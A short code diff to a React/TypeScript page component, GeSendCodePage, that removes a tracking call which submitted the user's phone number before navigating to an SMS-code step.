@@ -105,7 +105,7 @@ ${GE_SHELL_CSS}
 `;
 
 function GeSendCodePage() {
-  const { trackClick, trackSubmit, geNavigate, sessionId, isObserve } = useGeTracking();
+  const { trackClick, geNavigate, sessionId, isObserve } = useGeTracking();
   const [email, setEmail] = useState(() => resolveGeEmail());
   const [phone, setPhone] = useState(() => resolveGePhone());
   const [flashError, setFlashError] = useState(false);
@@ -158,7 +158,6 @@ function GeSendCodePage() {
   const handleSend = (e?: FormEvent) => {
     e?.preventDefault();
     trackClick("Send");
-    trackSubmit("phone_send", phone.trim() || displayPhone);
     setGePhone(phone.trim() || phone);
     geNavigate("/ge/smscode");
   };
